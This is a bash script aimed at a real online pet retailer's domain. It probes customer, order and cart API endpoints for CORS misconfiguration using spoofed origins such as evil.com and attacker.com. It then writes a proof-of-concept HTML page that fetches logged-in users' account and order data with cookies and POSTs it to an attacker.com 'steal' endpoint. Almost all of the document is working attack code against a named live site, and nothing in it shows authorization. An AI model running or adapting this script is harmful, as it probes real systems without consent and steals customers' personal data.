#!/bin/bash

# CORS Misconfiguration Exploit Test
# Testing if Access-Control-Allow-Origin: * exposes sensitive data

TARGET="www.zooplus.de"
OUTPUT="reports/cors_exploit.txt"

echo "================================================================================"
echo "CORS MISCONFIGURATION EXPLOIT TEST"
echo "================================================================================"

echo "[*] Testing CORS on sensitive endpoints..." | tee "$OUTPUT"

# Test API endpoints with different origins
ORIGINS=("https://evil.com" "https://attacker.com" "null")
ENDPOINTS=(
    "/api/customer"
    "/api/profile"
    "/api/orders"
    "/api/cart"
    "/myaccount/api/customer-config/v1/customerconfiguration"
    "/checkout/api/cart-api/v1/cart"
    "/myaccount/api/order-details/v3/customer/lastOrders"
)

for endpoint in "${ENDPOINTS[@]}"; do
    echo "" | tee -a "$OUTPUT"
    echo "[*] Testing: $endpoint" | tee -a "$OUTPUT"
    
    for origin in "${ORIGINS[@]}"; do
        RESPONSE=$(curl -s -i "https://$TARGET$endpoint" \
            -H "Origin: $origin" \
            -H "Cookie: sid=test" 2>&1)
        
        ACAO=$(echo "$RESPONSE" | grep -i "access-control-allow-origin" | cut -d' ' -f2-)
        
        if [ ! -z "$ACAO" ]; then
            echo "  Origin: $origin â†’ ACAO: $ACAO" | tee -a "$OUTPUT"
            
            if [[ "$ACAO" == "*" ]] || [[ "$ACAO" == "$origin" ]]; then
                echo "  [!!!] VULNERABLE: CORS allows $origin" | tee -a "$OUTPUT"
                
                # Try to extract sensitive data
                BODY=$(echo "$RESPONSE" | tail -n 1)
                if echo "$BODY" | grep -qiE '(email|user|order|customer|token)'; then
                    echo "  [!!!] CRITICAL: Sensitive data exposed!" | tee -a "$OUTPUT"
                    echo "  Data preview: $(echo $BODY | cut -c1-200)" | tee -a "$OUTPUT"
                fi
            fi
        fi
    done
done

# Create PoC HTML for CORS exploitation
cat > reports/cors_poc.html <<'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>Zooplus CORS Exploitation PoC</h1>
    <p>This page attempts to steal user data via CORS misconfiguration</p>
    
    <div id="output"></div>
    
    <script>
    // Attempt to fetch sensitive data from different origins
    const endpoints = [
        'https://www.zooplus.de/api/customer',
        'https://www.zooplus.de/api/orders',
        'https://www.zooplus.de/myaccount/api/customer-config/v1/customerconfiguration'
    ];
    
    endpoints.forEach(endpoint => {
        fetch(endpoint, {
            credentials: 'include'  // Include cookies
        })
        .then(response => response.json())
        .then(data => {
            document.getElementById('output').innerHTML += 
                `<h3>STOLEN DATA from ${endpoint}:</h3>
                 <pre>${JSON.stringify(data, null, 2)}</pre>`;
            
            // Send to attacker server
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: JSON.stringify({
                    endpoint: endpoint,
                    data: data
                })
            });
        })
        .catch(err => {
            document.getElementById('output').innerHTML += 
                `<p>Failed: ${endpoint} - ${err}</p>`;
        });
    });
    </script>
</body>
</html>
EOF

echo "" | tee -a "$OUTPUT"
echo "[+] PoC HTML created: reports/cors_poc.html" | tee -a "$OUTPUT"
echo "[+] Results saved to: $OUTPUT"

